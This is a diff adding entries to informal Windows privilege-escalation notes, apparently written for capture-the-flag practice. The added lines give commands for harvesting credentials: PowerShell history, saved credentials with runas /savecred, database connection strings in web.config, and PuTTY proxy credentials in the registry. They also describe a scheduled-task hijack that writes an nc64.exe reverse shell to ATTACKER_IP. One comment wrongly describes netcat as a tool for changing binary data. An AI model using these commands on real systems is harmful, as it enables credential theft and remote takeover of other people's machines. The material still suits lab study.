@@ -67,4 +67,32 @@ Get-NetGPO =  command will gather information on enforced policies.
 Get-NetDomainTrust =  command will list any domain you may access
 
 
-dir *flag*.txt /s //to find a file
+~~dir *flag*.txt /s //to find a file
+
+
+~~%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt // to read all the command
+              used by the user and show it in a notepad
+
+~~cmdkey /list
+~~runas /savecred /user:admin cmd.exe //to see saved password of other users
+
+~~internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
+
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+~~reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s //dispaly stored proxy credentials 
+
+schtasks // retrive scheduled tasks
+schtasks /query /tn vulntask /fo list /v // to retrive details abt a particular task ie /tn TASKNAME
+              always check Task To Run and Run An User
+icacls // helps to find the file permission 
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat // nc64.exe is a tool used to change data in binary
+schtasks /run /tn vulntask // to run a schtask
+
+
+    
+
+
